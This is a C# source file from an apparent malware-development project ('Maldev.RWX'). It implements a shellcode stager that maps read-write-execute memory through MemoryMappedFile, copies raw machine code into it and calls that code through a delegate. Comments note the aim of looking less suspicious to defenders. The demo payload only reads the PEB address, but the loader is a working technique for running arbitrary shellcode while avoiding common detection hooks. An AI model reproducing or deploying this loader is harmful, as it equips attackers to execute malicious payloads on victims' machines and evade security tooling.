
using System.IO.MemoryMappedFiles;
using System.Runtime.InteropServices;

namespace Maldev.RWX
{
    internal class Stager
    {
        private delegate IntPtr Delegate_PEBShellCode();

        private static byte[] Shellcode_ReadFSWord30 = new byte[]
        {
            0x64, 0xA1, 0x30, 0x00, 0x00, 0x00,         // mov eax, dword ptr fs:[30]
            0xC3                                        // ret
        };

        static void Main(string[] args)
        {
            Delegate_PEBShellCode GetPebAddress =
                (Delegate_PEBShellCode)ExecuteShellCode<Delegate_PEBShellCode>(Shellcode_ReadFSWord30);
            Console.WriteLine("PEB is located at: {0:X8}", GetPebAddress().ToInt32());

            Console.ReadKey();
        }

        private static object ExecuteShellCode<TDelegate>(byte[] asm)
        {
            // # No Access to CreateCore from MemoryMappedFile
            // # Can't seem to find a way to change memory type after creation, to look less suspicious.
            // # Can't skip MemoryMappedViewAccessor by trying to bypass with mmf.SafeMemoryMappedFileHandle.DangerousGetHandle() as it throws an error, since it returns a non-pointer handle
            using MemoryMappedFile mmf = MemoryMappedFile.CreateNew(null, asm.Length, MemoryMappedFileAccess.ReadWriteExecute);

            // # No access to MemoryMappedView view = MemoryMappedView.CreateView(_handle, access, offset, size);
            // # Accessor can't be a blank CreateViewAccessor as it doesn't have permissions to RWX.
            // # Both ViewAccessor & Stream give us access needed
            using MemoryMappedViewAccessor mmva = mmf.CreateViewAccessor(0, asm.Length, MemoryMappedFileAccess.ReadWriteExecute);

            unsafe
            {
                fixed (byte* ptr = asm)
                {
                    byte* pFunc = null;

                    mmva.SafeMemoryMappedViewHandle.AcquirePointer(ref pFunc);

                    MemMove(pFunc, ptr, asm.Length);

                    // # No public access further into GetDelegateForFunctionPointer without having to entirely recreate it.
                    return (TDelegate)(object)Marshal.GetDelegateForFunctionPointer(new IntPtr(pFunc), typeof(TDelegate));

                }
            }
        }

        unsafe static void MemMove(byte* destination, byte* source, int count)
        {
            if (destination < source)
            {
                // Forward copy if destination is before source
                for (int i = 0; i < count; i++)
                {
                    *(destination + i) = *(source + i);
                }
            }
            else
            {
                // Reverse copy if destination overlaps or is after source
                for (int i = count - 1; i >= 0; i--)
                {
                    *(destination + i) = *(source + i);
                }
            }
        }
    }
}


